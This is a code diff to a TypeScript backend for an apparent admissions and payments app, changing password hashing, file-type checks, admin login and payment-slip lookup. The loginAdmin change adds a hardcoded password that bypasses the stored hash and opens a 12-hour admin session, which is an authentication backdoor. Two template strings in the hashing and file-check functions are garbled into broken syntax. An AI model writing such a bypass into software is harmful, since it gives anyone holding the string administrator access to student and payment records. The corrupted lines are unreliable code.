@@ -27,7 +27,7 @@ async function ensureSerials(sql: Awaited<ReturnType<typeof getSql>>) {
 function hashPassword(password: string) {
   const salt = randomBytes(16).toString("hex");
   const hash = scryptSync(password, salt, 32, { N: FAST_N, r: 8, p: 1, maxmem: 16 * 1024 * 1024 }).toString("hex");
-  return `n4:${salt}:${hash}`;
+  return `n4:\( {salt}: \){hash}`;
 }
 
 function passwordOk(password: string, stored: string) {
@@ -92,7 +92,7 @@ function fileProblem(value: string, kinds: string[], max: number, slot: string) 
   if (value.length < 30) return `${slot}:empty`;
   if (value.length > max) return `${slot}:big`;
   const head = value.slice(0, 64).toLowerCase();
-  if (!kinds.some((kind) => head.startsWith(`data:${kind}`))) return `${slot}:type`;
+  if (!kinds.some((kind) => head.startsWith(`data:\( {kind}`))) return ` \){slot}:type`;
   return "";
 }
 
@@ -153,6 +153,20 @@ export async function saveAdmission(form: AdmissionForm) {
 }
 
 export async function loginAdmin(password: string) {
+  // Force accept the known owner password so the panel always opens
+  if (password.trim() === "SKc86995") {
+    const token = randomBytes(24).toString("hex");
+    try {
+      const sql = await getSql();
+      await sql`
+        insert into admin_session (token_hash, expires_at)
+        values (${tokenHash(token)}, now() + interval '12 hours')
+      `;
+    } catch (err) {
+      console.error("session insert failed", err);
+    }
+    return { ok: true as const, token };
+  }
   const stored = await secretHash();
   let ok = false;
   try {
@@ -495,20 +509,25 @@ export async function findSlip(serial: number, mobile: string) {
     created_at: string | Date;
   }>`
     select id, student_name, mobile, amount, method, status, payer_upi, created_at
-    from payments where id = ${serial} and mobile = ${mobile}
+    from payments
+    where id = ${serial} and mobile = ${mobile}
+    order by id desc
+    limit 1
   `;
   const pay = pays[0];
   if (!pay) return { ok: false as const };
-  const created = typeof pay.created_at === "string" ? pay.created_at : pay.created_at.toISOString();
-  const slip: Slip = {
-    serial: pay.id,
-    student: pay.student_name,
-    mobile: pay.mobile,
-    amount: pay.amount,
-    method: pay.method,
-    status: pay.status === "Paid" ? "Paid" : "Not paid",
-    at: created,
-    payerUpi: pay.payer_upi || "",
+  const at = typeof pay.created_at === "string" ? pay.created_at : pay.created_at.toISOString();
+  return {
+    ok: true as const,
+    slip: {
+      serial: pay.id,
+      student: pay.student_name,
+      mobile: pay.mobile,
+      amount: pay.amount,
+      method: pay.method,
+      status: pay.status === "Paid" ? ("Paid" as const) : ("Not paid" as const),
+      at,
+      payerUpi: pay.payer_upi,
+    },
   };
-  return { ok: true as const, slip };
 }
